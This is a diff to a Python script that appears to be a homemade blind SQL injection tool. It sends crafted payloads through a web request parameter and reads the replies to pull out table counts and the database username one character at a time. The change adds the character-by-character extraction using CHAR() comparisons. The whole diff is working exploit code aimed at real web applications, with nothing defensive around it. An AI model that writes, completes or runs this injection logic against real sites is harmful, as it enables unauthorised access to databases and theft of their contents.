@@ -121,12 +121,25 @@ def get_dbms_username(url, params, param, message):
     except:
         raise Exception('No tables found ?')    
     
-    request = "' and (SELECT length(CONCAT(COUNT(*), '/', USER())) FROM " + table_to_test + ") "
-    count = retrieve_count_or_length(url, params, param, message, request)
-    print "Count " + count
+    #get the count of the table
+    request = "' and (SELECT count(*) FROM " + table_to_test + ") "
+    count_table = retrieve_count_or_length(url, params, param, message, request)
 
-    # count_table = get_count_of_table(url, params, param, message, tables_to_test)
-    # payload = str(count_table) + '/' 
+    request = "' and (SELECT length(CONCAT(COUNT(*), '/', USER())) FROM " + table_to_test + ") "
+    count_user = retrieve_count_or_length(url, params, param, message, request)
+
+    display_message("Count table : " + count_table)
+    display_message("Count User : " + count_user)
+
+    i = len(str(count_table)) + 2
+    username_str = ""
+    while (i <= int(count_user)):
+        request = "' and (SELECT substring(CONCAT(COUNT(*), '/', USER()), " + str(i) + ", 1) FROM " + table_to_test + ") "
+        char = int(retrieve_count_or_length(url, params, param, message, request, True))
+        username_str = username_str + chr(char)
+        i = i + 1
+
+    print "Username of Database found : " + username_str
 
 
 def get_count_of_tables(url, params, param, message):
@@ -143,7 +156,7 @@ def get_count_of_table(url, params, param_to_test, message, name_table):
     print "[!] Count(*) of " + name_table + " : " + str(count)
 
 
-def retrieve_count_or_length(url, params, param_to_test, message, request):
+def retrieve_count_or_length(url, params, param_to_test, message, request, isChar=False):
     inf = 0
     sup = 10
 
@@ -152,13 +165,21 @@ def retrieve_count_or_length(url, params, param_to_test, message, request):
         inf_str = '{:g}'.format(inf)
         sup_str = '{:g}'.format(sup)
 
-        params[param_to_test] = request + " = " + inf_str + " or ''='"
+        if (isChar):
+            params[param_to_test] = request + " = CHAR(" + inf_str + ") or ''='"    
+        else:
+            params[param_to_test] = request + " = " + inf_str + " or ''='"    
+        
         req = send_HTTP_request(url, params)
 
         if (message in req.content):
             break
     
-        params[param_to_test] = request + " >= " + sup_str + " or ''='"
+        if (isChar):
+            params[param_to_test] = request + " >= CHAR(" + sup_str + ") or ''='"
+        else:
+            params[param_to_test] = request + " >= " + sup_str + " or ''='"
+
         req = send_HTTP_request(url, params)
 
         if (message in req.content):
